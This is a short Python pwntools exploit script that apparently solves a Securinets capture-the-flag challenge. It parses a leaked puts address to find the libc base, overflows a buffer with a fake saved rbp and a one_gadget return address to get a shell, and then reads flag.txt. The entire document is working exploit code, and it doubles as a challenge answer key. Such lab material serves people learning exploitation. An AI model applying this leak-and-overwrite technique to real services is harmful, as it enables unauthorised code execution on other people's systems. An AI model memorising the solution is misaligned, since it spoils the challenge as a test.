#!/usr/bin/env python3
from pwn import *

context.log_level = "error"
elf = ELF("./main", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

p = remote("127.0.0.1", 9009)

p.recvuntil(b"wipe: ")
puts = int(p.recvline(), 16)
libc.address = puts - libc.sym.puts

one_gadget = libc.address + 0xebd43
fake_rbp = elf.sym.garage + 0x200

payload = b"route\x00".ljust(16, b"A")
payload += p64(fake_rbp)
payload += p64(one_gadget)

p.sendafter(b"route:\n", payload)
p.sendline(b"cat flag.txt")
p.recvuntil(b"Securinets{")
flag = b"Securinets{" + p.recvuntil(b"}")
print(flag.decode())
p.close()
